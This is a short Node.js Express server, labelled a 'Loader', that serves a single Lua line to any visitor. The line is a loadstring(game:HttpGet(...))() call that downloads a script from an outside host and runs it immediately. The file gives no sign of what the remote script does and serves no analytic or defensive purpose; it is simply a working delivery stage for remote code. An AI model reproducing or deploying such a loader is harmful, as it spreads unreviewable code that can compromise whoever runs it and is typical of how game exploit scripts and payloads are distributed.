import express from "express";

const app = express();
app.disable("x-powered-by");

const LUA_PAYLOAD = `loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/c9c4be7a2d1186fa1075ebbe5b410ad1d7aa892193c8a427616aada4b26fe6b3/download"))()

`.trim();

app.get("/", (req, res) => {
  res
    .status(200)
    .set("Content-Type", "text/plain; charset=utf-8")
    .set("Cache-Control", "no-store")
    .send(LUA_PAYLOAD);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Loader running on port ${PORT}`);
});
